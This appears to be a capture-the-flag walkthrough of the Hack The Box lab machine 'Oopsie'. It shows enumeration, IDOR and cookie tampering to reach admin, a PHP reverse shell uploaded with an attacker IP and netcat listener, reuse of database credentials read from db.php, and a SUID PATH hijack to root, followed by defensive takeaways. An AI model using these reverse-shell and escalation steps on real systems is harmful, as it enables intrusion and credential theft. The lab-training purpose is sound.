Yooo guys, it's ju4dy the landlord again.

# Oopsie — Hack The Box Starting Point

|  |  |
| --- | --- |
| **Platform** | Hack The Box — Starting Point |
| **Tier** | 2 |
| **Difficulty** | Easy |
| **Operating system** | Linux |
| **Target IP** | `10.129.95.191` |
| **Skills** | Web enumeration, IDOR, cookie tampering, file upload, MySQL credential reuse, SUID PATH hijacking |

## Overview

Oopsie runs a small "MegaCorp" PHP application that looks like an internal file-sharing portal. It can be
entered with the guest account, but the application trusts two things it should not: an `id` value in the URL
and a role stored in a cookie. Changing both promotes the guest session to an administrator, and the
administrative area offers a file upload form with no restriction on what may be uploaded. A PHP reverse shell
delivered through that form gives a shell as `www-data`.

From the web root, `db.php` hands over MySQL credentials for the user `robert`, and `robert` turns out to be a
member of the `bugtracker` group. The group's namesake binary is SUID root and calls `cat` without an absolute
path, which turns into a straightforward `PATH` hijack and a root shell.

## Enumeration

```bash
nmap -sVC 10.129.95.191
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-19 12:21 +0100
Nmap scan report for 10.129.95.191
Host is up (0.58s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The web server is the only interesting service. The landing page is a static-looking welcome screen, and
viewing the page source reveals a reference to the application's own directory, `cdn-cgi/login`, which is
where the login form lives.

Directory brute forcing confirms the layout and shows that uploads are stored under a predictable path:

```bash
gobuster dir -u http://10.129.95.191/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
```

```text
/css                  (Status: 301) [Size: 312] [--> http://10.129.95.191/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.95.191/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.95.191/images/]
/index.php            (Status: 200) [Size: 10932]
/js                   (Status: 301) [Size: 311] [--> http://10.129.95.191/js/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.95.191/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.95.191/uploads/]
```

The repeated `403` responses for `.htaccess` and `.htpasswd` are trimmed above; they only confirm that Apache's
default access rules are in place.

## Exploitation

### Access as guest

The login form accepts a guest account. Signing in lands on an account page whose URL carries the account
number as a parameter:

```text
http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2
```

An identifier in a URL is an invitation to test the neighboring values. Changing `id=2` to `id=1` returns a
different account record instead of an error, which is a textbook insecure direct object reference: the
application checks that a user is logged in, but never checks that the requested record belongs to them.

The page also discloses the values the application stores in cookies for the session. Two of them matter: one
carries the role, the other the account id. Editing the role from `guest` to `admin` and the id to `1` in the
browser's developer tools raises the session's privileges, because the server trusts the client to state its
own role:

```text
role=admin; id=1
```

With the cookies rewritten, the administrative area becomes reachable, including an upload form. The lesson
here is the combination: the IDOR leaks the admin account's details, and the trusted cookie turns that leak
into privilege escalation.

### Uploading a reverse shell

The upload form performs no meaningful validation on the file it receives, and the `uploads` directory found
during enumeration is served directly by Apache. A PHP reverse shell is therefore executed by simply
requesting it.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

The script's two settings are edited before upload:

```php
$ip = '10.10.17.166';  // attacker address
$port = 4444;          // listener port
```

A listener is started, the file is uploaded through the form, and the shell is triggered by requesting it:

```bash
nc -lvnp 4444
```

```text
http://10.129.95.191/uploads/php-reverse-shell.php
```

The connection arrives as the web server user:

```text
www-data@oopsie:/$
```

### A usable terminal

The initial shell is non-interactive, so it is upgraded to a proper TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Lateral movement to `robert`

The application's directory is readable and contains its database configuration:

```bash
cd /var/www/html/cdn-cgi/login
cat db.php
```

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

Those credentials are reused for the Linux account of the same name, which is common in this kind of
application: a developer writes the database user and password once and uses the same pair everywhere.

```bash
su robert
```

```text
robert@oopsie:/var/www/html/cdn-cgi/login$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

The second group is the interesting one.

## Privilege escalation

The `bugtracker` group exists to run a small support tool, and that tool is installed setuid root:

```bash
ls -l /usr/bin/bugtracker
strings /usr/bin/bugtracker
```

`strings` shows that the program shells out to `cat` by name rather than by absolute path. Because a setuid
binary keeps its elevated privileges while it executes, the `cat` it launches is looked up in `PATH` as root —
and `PATH` is under our control. Placing a shell named `cat` in a directory we can write to and putting that
directory first means the setuid program executes our shell as root.

<!-- screenshot: bugtracker SUID abuse -->

Reproducing the step:

```bash
cp /bin/bash /tmp/cat
export PATH=/tmp:$PATH
bugtracker
```

The result is a root shell:

```text
root@oopsie:/tmp# whoami
root
```

The same trick works with any interpreter that is invoked by bare name — `python`, `perl`, `sh` — which is why
absolute paths matter in privileged programs.

## Key takeaways

- **Authorization must be checked on the server, per object.** The `id` parameter let a guest read the admin
  record; comparing the requested object against the session's owner prevents it. Random, unguessable
  identifiers and server-side access checks are the fix.
- **Never trust a cookie to carry a role.** The session should reference a server-side record of privileges;
  a client-supplied `role=admin` is a privilege escalation waiting to be typed.
- **Validate uploads by type and location.** Storing uploaded files outside the web root, renaming them, and
  refusing executable extensions removes the direct path from upload to code execution.
- **Do not reuse database passwords as system passwords.** `db.php` gave both a database account and a Linux
  login; separate, generated secrets would have stopped the lateral movement at `www-data`.
- **Privileged binaries must call external programs by absolute path.** The SUID `bugtracker` calling `cat`
  from `PATH` was the entire privilege escalation, and the group-based permission design made it reachable
  from an ordinary account.
